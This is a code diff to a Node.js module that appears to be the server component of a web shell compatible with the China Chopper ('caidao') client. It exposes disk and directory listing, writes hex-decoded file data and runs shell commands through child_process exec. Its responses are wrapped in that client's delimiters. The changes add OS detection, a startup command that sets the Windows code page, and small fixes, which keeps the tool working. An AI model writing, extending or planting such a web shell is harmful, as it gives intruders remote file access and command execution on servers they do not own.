@@ -4,6 +4,8 @@ var http = require('http');
 var exec = require('child_process').exec;
 
 var enumParameters = {
+	'os': os.platform(),	// win32
+	'codePage': null,
 	'path': __dirname.replace(/\\/g, '/'),
 	'filename': __filename.replace(/\\/g, '/'),
 }
@@ -25,7 +27,7 @@ var getAbsolutePath = function(path) {
 
 var getCurrentDisk = function() {
 	var ret = [];
-	if (os.platform() == 'win32') {
+	if (enumParameters.os == 'win32') {
 		for (var i = 97; i < 123; i++) {
 			var c = String.fromCharCode(i) + ':';
 			if (fs.existsSync(c))
@@ -59,7 +61,7 @@ var getDirInfo = function(dir, cb) {
 		if (err || nullOrEmpty(files)) {
 			return cb(ret);
 		}
-		var c = 0;
+		var endTag = 0;
 		files.forEach(function(file, index) {
 			var filePath = dir + '/' + file;
 			fs.stat(filePath, function(err, data) {
@@ -72,7 +74,7 @@ var getDirInfo = function(dir, cb) {
 						ret.d.push(strFmt('{1}/\t{2}\t0\t-\n', file, dateFmt(data.mtime)));
 					}
 				}
-				if (++c == files.length) {
+				if (++endTag == files.length) {
 					return cb(ret);
 				}
 			});
@@ -153,8 +155,9 @@ var main = function(req, res, cb) {
 				});
 			}
 			break;
-		case "G":
+		case "G":	// well this is not compatible with caidao
 			{
+				var byteA = [];
 				for (var i = 0; i < Z2.length; i += 2) {
 					byteA.push(parseInt(Z2.substr(i, 2), 16));
 				}
@@ -212,8 +215,16 @@ var main = function(req, res, cb) {
 	}
 }
 
+var init = function(){
+	if(enumParameters.os == 'win32'){
+		exec('chcp 437 >nul&chcp 65001 >nul');
+	}
+}
+
+init();
+
 exports.do = function(req, res) {
 	return main(req, res, function(data) {
 		data ? res.send(strFmt('\x2D\x3E\x7C{1}\x7C\x3C\x2D', data)) : res.end();
-	})
+	});
 }
